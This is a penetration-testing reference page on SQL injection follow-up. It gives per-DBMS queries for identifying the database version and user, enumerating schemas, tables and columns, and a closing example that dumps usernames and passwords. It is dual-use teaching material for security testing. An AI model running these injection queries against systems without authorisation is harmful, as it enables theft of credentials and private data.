---
title: Database Enumeration
description: Enumerate database information and dump tables
categories: [Web Attack, SQL Injection, Database]
tags: [Web Attack, SQL Injection]
weight: 2
---

Database enumeration and dumping are crucial components of SQL injection testing after the vulnerability has been confirmed. We can extract sensitive data, user credentials, and much more, subject to the database account's privileges.

## Database Identification
The first step is to identify the type and version of the **database management system (DBMS)** we are interacting with:

**MySQL**:
```sql
SELECT @@version;
```

**MSSQL**:
```sql
SELECT @@version;
```

**PostgreSQL**:
```sql
SELECT version();
```

## Database User
It may also be beneficial to enumerate the database identity. In MySQL, `USER()`/`SESSION_USER()` describe the connection identity and `CURRENT_USER()` the account used for privilege checks. In MSSQL, `CURRENT_USER`/`USER_NAME()` return the database user, while `SYSTEM_USER` returns the current login context. In PostgreSQL, `session_user` and `current_user` can differ after role changes or inside security-definer functions.

**MySQL**:
```sql
SELECT USER();
SELECT CURRENT_USER();
SELECT CURRENT_USER;
SELECT SESSION_USER();
```

**MSSQL**:
```sql
SELECT CURRENT_USER;
SELECT user_name();
SELECT system_user;
SELECT user;
```

**PostgreSQL**:
```sql
SELECT user;
SELECT current_user;
SELECT session_user;
SELECT usename FROM pg_user;
```

## Database Schema
Database schema refers to the structure of the database, including the databases, tables, and columns. We can use SQL injection to dump this information to find interesting information for the purposes of our engagement.

**MSSQL**:
| Information           | Payload                                                                                                 |
|-----------------------|---------------------------------------------------------------------------------------------------------|
| Database names        | `SELECT name FROM master.sys.databases;` |
| Table names           | `SELECT name FROM [DB_NAME].sys.tables;`                                               |
| Column names          | `SELECT COLUMN_NAME, DATA_TYPE FROM [DB_NAME].INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA='dbo' AND TABLE_NAME='sometable';`  |

**MySQL**:
| Information           | Payload                                                                                                 |
|-----------------------|---------------------------------------------------------------------------------------------------------|
| Database names        | `SELECT schema_name FROM information_schema.schemata`                                                  |
| Table names           | `SELECT table_name FROM information_schema.tables WHERE table_schema='DB_NAME'`                           |
| Column names          | `SELECT column_name FROM information_schema.columns WHERE table_schema='DB_NAME' AND table_name='TB_NAME'`  |

**PostgreSQL**:
| Information           | Payload                                                                                                 |
|-----------------------|---------------------------------------------------------------------------------------------------------|
| Database names        | `SELECT datname FROM pg_database`                                                                       |
| Table names           | `SELECT table_name FROM information_schema.tables WHERE table_schema='<SCHEMA_NAME>'`                   |
| Column names          | `SELECT column_name FROM information_schema.columns WHERE table_schema='<SCHEMA_NAME>' AND table_name='data_table'`                      |

Replace `DB_NAME`, `TB_NAME`, `<SCHEMA_NAME>` and example table names with discovered names. These are standalone SQL queries; adapt them to the injection context and required column count. PostgreSQL information-schema views describe only the current database and objects visible to the current role; schema names are not database names. `pg_user` lists roles rather than just the current user.

## Dumping data
After identifying databases, tables, and columns, use `SELECT` statements to retrieve accessible data.

Example:
```sql
SELECT username, password FROM users;
```

## References
- [SQL Injection section in PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
